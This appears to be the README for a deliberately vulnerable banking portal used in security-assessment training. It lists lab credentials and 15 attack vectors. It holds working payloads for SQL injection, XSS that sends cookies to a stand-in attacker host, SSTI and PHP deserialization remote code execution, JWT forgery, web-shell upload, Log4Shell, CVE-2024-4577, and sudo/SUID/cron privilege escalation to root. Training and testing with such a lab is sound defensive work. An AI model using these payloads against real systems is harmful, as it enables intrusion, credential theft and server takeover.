# Cyber Drill VM — Intentionally Vulnerable Banking Application
## Union Bank of India — Security Assessment Training Environment

Single-container (Docker) or bare-metal deployment of a vulnerable banking portal with 15 attack vectors across web, API, OS, and network layers.

## ⚠ WARNING
**INTENTIONALLY VULNERABLE.** Deploy **ONLY** in isolated lab environments for authorized security assessment training.

---

## Deployment

### Option A — Docker (Recommended)
```bash
docker compose up -d --build      # First boot ~30s for MySQL init
```

### Option B — Bare Metal Ubuntu 22.04 VM
```bash
sudo bash setup.sh                # One-click full deployment
```

### Validation (from Kali Linux)
```bash
bash validate.sh <TARGET_IP>      # Automated testing of all 15 vectors
```

---

## Services

| Service               | Port  | Access                                |
|-----------------------|-------|---------------------------------------|
| Banking Portal        | 80    | http://\<TARGET\>/                    |
| Customer Support Portal | 8888 | http://\<TARGET\>:8888/              |
| Java Banking App      | 8080  | http://\<TARGET\>:8080/bankingapp/   |
| Tomcat Manager        | 8080  | http://\<TARGET\>:8080/manager/      |
| MySQL                 | 3306  | `mysql -h \<TARGET\> -u bankadmin`   |
| SSH                   | 22    | `ssh lowpriv@\<TARGET\>`             |

---

## Credentials

### Web Portal (Port 80)
| Role     | Username    | Password       |
|----------|-------------|----------------|
| Admin    | `admin`     | `Admin@123`    |
| Manager  | `rk_sharma` | `Manager@2024` |
| Clerk    | `priya_m`   | `Clerk@2024`   |
| Cashier  | `amit_p`    | `Cashier@2024` |
| Customer | `customer1` | `password`     |

### Infrastructure
| Service         | Username    | Password           |
|-----------------|-------------|-------------------|
| SSH             | `lowpriv`   | `lowpriv123`       |
| SSH             | `ubicd4`    | `UbiCD4@2024`      |
| MySQL (root)    | `root`      | `R00t_MySQL_2024!` |
| MySQL (app)     | `bankadmin` | `B@nkAdm1n_2024`  |
| Tomcat Manager  | `admin`     | `admin`            |

---

## Attack Vectors — 15 Verified Scenarios

---

### 1. SQL Injection — API Endpoint
**Location:** `/api/accounts.php?api=get_user&acc_no=`  
**Parameter:** `acc_no` (GET, no authentication)

The `acc_no` parameter is concatenated directly into `WHERE a.id = $acc_no OR a.account_number = '$acc_no'` without parameterization.

**Payloads:**
```
# Dump all 8 accounts
GET /api/accounts.php?api=get_user&acc_no=1 OR 1=1

# UNION-based credential extraction (16 columns)
GET /api/accounts.php?api=get_user&acc_no=0 UNION SELECT 1,username,password,4,5,6,7,8,9,10,11,12,full_name,email,phone,pan_number FROM users--

# Error-based hash extraction
GET /api/accounts.php?api=get_user&acc_no=1 AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))
```

---

### 2. Second-Order SQL Injection
**Store:** Fund Transfer → Add Beneficiary → `nickname` field  
**Trigger:** `/api/accounts.php?api=beneficiary_transactions&ben_id=<ID>`

Nickname is stored safely via prepared statement, but retrieved and injected directly into a second query.

**Payload (nickname field):**
```
' UNION SELECT 1,username,password,4,5,6,7,8,9,10,11,12,13 FROM users--
```

---

### 3. Reflected XSS
**Location:** `/api/accounts.php?api=render_account&acc_no=`

```
GET /api/accounts.php?api=render_account&acc_no=<script>alert('XSS')</script>
```
Output reflected in `<h2>` tag without encoding.

---

### 4. Stored XSS
**Store:** Messages → Send Message → `body` field  
**Trigger:** Messages page + Dashboard (both render body without `htmlspecialchars()`)

```html
<script>document.location='http://ATTACKER/steal?c='+document.cookie</script>
```

---

### 5. Server-Side Template Injection (SSTI)
**Location:** Fund Transfer → Transfer Funds → `description` field  
**Engine:** Custom PHP template engine evaluating `{{ }}` expressions

```
{{7*7}}                          → 49 (detection)
{{system("id")}}                 → uid=33(www-data)
{{system("cat /etc/passwd")}}    → full file contents
```

---

### 6. PHP Object Injection → RCE
**Location:** `/api/auth.php?action=confirm_transaction&data=`  
**Gadget:** `SystemCommand` class with `__destruct()` → `system($this->cmd)`

```
GET /api/auth.php?action=confirm_transaction&data=O%3A13%3A%22SystemCommand%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22id%22%3B%7D
```

---

### 7. Nested API — Unauthenticated
**Location:** `/api/internal.php` — zero authentication

```
GET /api/internal.php?action=get_config          # JWT secrets, API keys, SMTP password
GET /api/internal.php?action=get_all_users        # PAN, Aadhaar, password hashes
GET /api/internal.php?action=execute_query&query=SELECT * FROM users
GET /api/internal.php?action=system_info          # OS, PHP version, extensions
```

---

### 8. JWT 'none' Algorithm Bypass
**Location:** `/api/auth.php?action=verify_token`

```python
import base64, json
h = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
p = base64.b64encode(json.dumps({"user_id":1,"username":"admin","role":"admin"}).encode()).decode().rstrip('=')
token = f"{h}.{p}."
# GET /api/auth.php?action=verify_token&token=<FORGED_TOKEN>  → {"status":"valid"}
```

---

### 9. Unrestricted File Upload → Web Shell
**Location:** File Upload page (`upload.php`) → files go to `/uploads/`  
No server-side validation. PHP execution enabled in uploads directory.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -b 'PHPSESSID=<COOKIE>' -F 'document=@shell.php' http://<TARGET>/upload.php
curl http://<TARGET>/uploads/shell.php?cmd=id
```

---

### 10. Log4Shell (CVE-2021-44228)
**Location:** `http://<TARGET>:8080/bankingapp/?query=`  
**Component:** Log4j 2.14.1 on Tomcat 9.0.65

```
GET http://<TARGET>:8080/bankingapp/?query=${jndi:ldap://ATTACKER:1389/exploit}
```
Requires JNDIExploit or marshalsec on attacker machine.

---

### 11. Credential Stuffing — No Account Lockout
**Location:** `/index.php` and `/api/auth.php?action=login`

No lockout after unlimited failed attempts. Login form has client-side JS validation; API endpoint has none — enabling both brute force and SQLi:
```
curl -d "username=admin' OR 1=1-- &password=x" http://<TARGET>/api/auth.php?action=login
```

---

### 12. Privilege Escalation — SSH to Root

**SSH:** `ssh lowpriv@<TARGET>` (password: `lowpriv123`)

**Vector A — Writable cron job:**
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /home/lowpriv/pwn.sh
# Wait 60s, then: /tmp/rootbash -p
```

**Vector B — Sudo abuse:**
```bash
sudo find / -exec /bin/bash \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo vim -c ':!/bin/bash'
```

**Vector C — SUID logviewer:**
```bash
/usr/local/bin/logviewer "/etc/passwd; /bin/bash"
```

---

### 13. Weak MD5 Hashing & Sensitive Data Exposure

| Username  | MD5 Hash                           | Password       |
|-----------|------------------------------------|----------------|
| admin     | `0e7517141fb53f21ee439b355b5a1d0a` | `Admin@123`    |
| rk_sharma | `7ccbad448abbc8eeb5d417b90c91c748` | `Manager@2024` |
| customer1 | `5f4dcc3b5aa765d61d8327deb882cf99` | `password`     |

Exposure points: `/api/internal.php?action=get_config`, error messages with `query_debug`, `.env` file.

---

### 14. Weak SSH Configuration
- `PermitRootLogin yes`, `MaxAuthTries 100`
- Weak ciphers: `aes128-cbc`, `3des-cbc`
- Banner discloses server version and OS
- `X11Forwarding yes`, `AllowTcpForwarding yes`

---

### 15. CVE-2024-4577 — PHP-CGI Argument Injection
**Location:** `http://<TARGET>:8888/` (Customer Support Portal)  
**Component:** PHP 8.1 running in CGI mode

The portal uses PHP-CGI with a handler that maps soft-hyphen characters (0xAD) to regular hyphens, bypassing the CVE-2012-1823 argument filter.

**Source disclosure (-s flag):**
```
GET http://<TARGET>:8888/index.php?%ADs
```

**Remote Code Execution:**
```bash
curl -d '<?php echo "RCE:" . system("id"); ?>' \
  'http://<TARGET>:8888/index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input'
```

---

## Container Management

```bash
docker exec -it cyber-drill-vm bash
docker compose logs -f
docker compose down -v && docker compose up -d --build   # Full reset
```

## Notes

- Docker: `--privileged` flag required for SUID and cron priv-esc
- Docker: SSH mapped to port 2222 (`ssh -p 2222 lowpriv@localhost`)
- Bare metal: All services run natively, SSH on port 22
- MySQL data persists in Docker volume; `docker compose down -v` resets it
